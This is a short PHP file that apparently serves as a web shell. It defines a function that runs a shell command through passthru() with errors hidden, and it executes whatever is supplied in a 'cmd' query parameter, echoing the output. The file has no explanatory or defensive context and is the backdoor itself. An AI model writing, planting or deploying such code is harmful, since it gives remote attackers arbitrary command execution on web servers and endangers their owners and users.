<?php
function ekse($cmd){
	@ob_start();
	@passthru($cmd);
	$buff = @ob_get_contents();
	@ob_end_clean();
	return $buff;
}

if(isset($_GET['cmd'])){
	$result = ekse($cmd);
	echo $result;
}
	
?>